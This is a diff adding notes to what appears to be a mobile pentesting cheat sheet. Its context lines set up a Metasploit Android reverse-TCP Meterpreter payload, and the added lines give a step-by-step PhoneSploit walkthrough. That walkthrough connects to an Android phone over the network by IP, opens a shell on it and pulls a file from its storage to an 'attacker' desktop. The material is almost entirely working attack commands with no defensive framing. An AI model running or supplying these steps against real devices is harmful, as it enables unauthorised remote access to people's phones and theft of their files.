@@ -22,4 +22,17 @@ set payload android/meterpreter/reverse_tcp
 set LHOST 10.10.1.13
 exploit -j -z or run
 
-
+with PhoneSploit
+	sudo su
+	cd PhoneSploit
+	python3 -m pip install colorama
+	python3 phonesploit.py
+	phonesploit(main_menu)> 3 (Enter 3 to connect to a phone)
+	phonesploit(connect_phone)> (Enter android ip address)
+	phonesploit(main_menu)> 4 (after successful connect enter 4 to connect to shell)
+	x84_64:/ $ run commands like ls, cd sdcard, echo $'data in file' > secret.txt (to create a file)
+	exit to exit shell
+	phonesploit(main_menu)> 9 (to copy files from android to pc)
+	phonesploit(file_pull)> ip address (enter ip address of android to connect to device)
+	phonesploit(file_pull) > /sdcard/Download/secret.txt (Enter the file to download)
+	phonesploit(file_pull) > /home/attacker/Desktop (Enter the location where to copy)
